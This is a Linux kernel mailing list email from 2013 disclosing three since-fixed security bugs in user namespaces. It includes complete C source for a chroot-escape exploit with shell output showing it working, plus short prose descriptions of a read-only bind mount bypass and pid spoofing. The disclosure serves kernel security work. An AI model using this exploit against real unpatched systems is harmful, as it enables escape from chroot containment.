Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S932136Ab3DMRQs (ORCPT <rfc822;w@1wt.eu>);
	Sat, 13 Apr 2013 13:16:48 -0400
Received: from mail-ve0-f174.google.com ([209.85.128.174]:63372 "EHLO
	mail-ve0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1753753Ab3DMRQr (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Sat, 13 Apr 2013 13:16:47 -0400
MIME-Version: 1.0
From: Andy Lutomirski <luto@amacapital.net>
Date: Sat, 13 Apr 2013 10:16:26 -0700
Message-ID: <CALCETrX6Rcv1uMfPdG=K6THusgx-CAjHRkUpMwruBNaZGDvb8Q@mail.gmail.com>
Subject: Summary of security bugs (now fixed) in user namespaces
To: "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
        oss-security@lists.openwall.com
Content-Type: text/plain; charset=ISO-8859-1
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

I previously reported these bugs privatley.  I'm summarizing them for
the historical record.  These bugs were never exploitable on a
default-configured released kernel, but some 3.8 versions are
vulnerable depending on configuration.

=== Bug 1: chroot bypass ===

It was possible for a chrooted program to create a new user namespace
and a new mount namespace.  It could keep an fd to the old root, which
is outside the new root, and therefore use it to escape, like this:

--- begin ---
/* break_chroot.c by */
/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */

#define _GNU_SOURCE
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <err.h>

#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif

static void printcwd(void)
{
  /* This is fugly. */
  static int lastlen = -1;
  char buf[8192];
  if (getcwd(buf, sizeof(buf))) {
    if (strlen(buf) != lastlen)
      printf("%s\n", buf);
    lastlen = strlen(buf);
  } else {
    warn("getcwd");
  }
}

int fn(void *unused)
{
  int i;
  int fd;

  fd = open("/", O_RDONLY | O_DIRECTORY);
  if (fd == -1)
    err(1, "open(\".\")");
  if (unshare(CLONE_NEWUSER) != 0)
    err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNS) != 0)
    err(1, "unshare(CLONE_NEWNS)");
  if (fchdir(fd) != 0)
    err(1, "fchdir");
  close(fd);

  for (i = 0; i < 100; i++) {
    printcwd();
    if (chdir("..") != 0) {
      warn("chdir");
      break;
    }
  }

  fd = open(".", O_PATH | O_DIRECTORY);
  if (fd == -1)
    err(1, "open(\".\")");

  if (fd != 3) {
    if (dup2(fd, 3) == -1)
      err(1, "dup2");
    close(fd);
  }
  _exit(0);
}

int main(int argc, char **argv)
{
  int dummy;

  if (argc < 2) {
    printf("usage: break_chroot COMMAND ARGS...\n\n"
           "You won't be entirely out of jail.  / is still the jail root.\n");
    return 1;
  }

  close(3);

  if (signal(SIGCHLD, SIG_DFL) != 0)
    err(1, "signal");

  if (clone(fn, &dummy, CLONE_FILES | SIGCHLD, 0) == -1)
    err(1, "clone");

  int status;
  if (wait(&status) == -1)
    err(1, "wait");
  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
    errx(1, "child failed");
  if (fchdir(3) != 0)
    err(1, "fchdir");
  close(3);

  execv(argv[1], argv+1);
  err(1, argv[1]);

  return 0;
}
--- end ---

$ ls /
bin   dev  home  lib64       media  opt   root  sbin  sys  usr
boot  etc  lib   lost+found  mnt    proc  run   srv   tmp  var
$ /path/to/break_chroot /bin/sh
(unreachable)/hostfs
(unreachable)/
sh-4.2$ pwd
(unreachable)/
sh-4.2$ ls
bin  dev  etc  hostfs  init  lib  lib64  proc  root  run  sbin  sys  usr  var

=== Bug 2: read-only bind mount bypass ===

This one was straightforward: create a new userns and mount namespace,
then remount a previously read-only bind mount as read-write.  It
worked.

=== Bug 3: SCM_CREDENTIALS pid spoofing ===

This one was also straightforward: create a new userns and then spoof
the pid.  The capability check was on the wrong namespace.
